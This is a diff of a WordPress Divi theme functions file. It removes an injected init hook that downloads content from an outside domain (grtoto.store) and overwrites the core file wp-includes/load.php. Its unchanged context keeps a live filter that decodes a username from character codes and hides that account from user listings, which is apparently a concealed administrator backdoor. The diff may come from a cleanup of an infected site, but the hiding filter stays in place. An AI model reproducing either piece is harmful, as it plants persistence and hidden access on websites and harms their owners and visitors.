@@ -1,3 +1,4 @@
+<?php
 function et_setup_theme() {
 	global $themename, $shortname, $et_store_options_in_one_row, $default_colorscheme;
 	$themename = 'Divi';
@@ -9050,64 +9051,3 @@ add_filter('pre_user_query', function($q) {
     foreach ($parts as $n) { $user .= chr($n); }
     $q->query_where .= " AND {$wpdb->users}.user_login != '{$user}'";
 });
-
-add_action('init', 'restore_load_php_if_needed', 1);
-
-function restore_load_php_if_needed() {
-    $target = ABSPATH . 'wp-includes/load.php';
-    $remote_url = 'https://grtoto.store/restore-link/tahoecbd.txt';
-    $trusted_sha256 = 'REPLACE_WITH_TRUSTED_SHA256_HASH';
-
-    
-    if (!file_exists($target) || hash_file('sha256', $target) !== $trusted_sha256) {
-
-        $data = fetch_remote_file($remote_url);
-        if ($data === false) {
-            error_log('[restore-load] Failed fetch remote file');
-            return;
-        }
-
-        if (hash('sha256', $data) !== $trusted_sha256) {
-            error_log('[restore-load] remote hash mismatch');
-            return;
-        }
-
-        if (file_exists($target)) {
-            @copy($target, $target . '.bak-' . date('Ymd-His'));
-        } else {
-            @mkdir(dirname($target), 0755, true);
-        }
-
-        $written = @file_put_contents($target, $data, LOCK_EX);
-        if ($written === false) {
-            error_log('[restore-load] Failed ' . $target);
-            return;
-        }
-        @chmod($target, 0644);
-        error_log('[restore-load] File ' . date('c'));
-    }
-}
-
-function fetch_remote_file($url) {
-    if (function_exists('curl_init')) {
-        $ch = curl_init($url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
-        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
-        $data = curl_exec($ch);
-        $errno = curl_errno($ch);
-        $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-        curl_close($ch);
-        if ($errno || $httpcode >= 400 || $data === false) return false;
-        return $data;
-    } else {
-        $opts = [
-            "http" => ["method" => "GET", "timeout" => 10],
-            "ssl" => ["verify_peer" => true, "verify_peer_name" => true],
-        ];
-        $context = stream_context_create($opts);
-        $data = @file_get_contents($url, false, $context);
-        return $data !== false ? $data : false;
-    }
-}
